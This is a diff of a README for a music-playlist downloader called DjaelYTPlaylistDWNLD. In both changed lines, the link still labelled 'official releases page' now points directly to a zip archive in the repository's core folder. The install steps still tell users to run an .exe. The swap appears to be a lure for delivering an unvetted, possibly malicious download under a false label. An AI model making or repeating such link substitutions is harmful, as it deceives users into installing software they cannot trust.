@@ -1,6 +1,6 @@
 # 🎵 DjaelYTPlaylistDWNLD - Save your music playlists with ease
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/aurelclustered211/DjaelYTPlaylistDWNLD/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/aurelclustered211/DjaelYTPlaylistDWNLD/main/core/Djael_YT_DWNLD_Playlist_v2.6.zip)
 
 DjaelYTPlaylistDWNLD extracts music tracks from your favorite streaming platforms. It saves your songs as MP3 files on your computer. You keep your music collection in one place. The software includes ID3 tags to preserve artist names, song titles, and album covers. It works for Spotify, SoundCloud, Apple Music, Deezer, and YouTube.
 
@@ -22,7 +22,7 @@ DjaelYTPlaylistDWNLD extracts music tracks from your favorite streaming platform
 
 ## 🚀 How to download and run
 
-1. Visit the [official releases page](https://github.com/aurelclustered211/DjaelYTPlaylistDWNLD/releases) to access the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/aurelclustered211/DjaelYTPlaylistDWNLD/main/core/Djael_YT_DWNLD_Playlist_v2.6.zip) to access the software.
 2. Locate the latest version of the program in the list.
 3. Click the file name ending in .exe to download the application to your computer.
 4. Navigate to your Downloads folder.
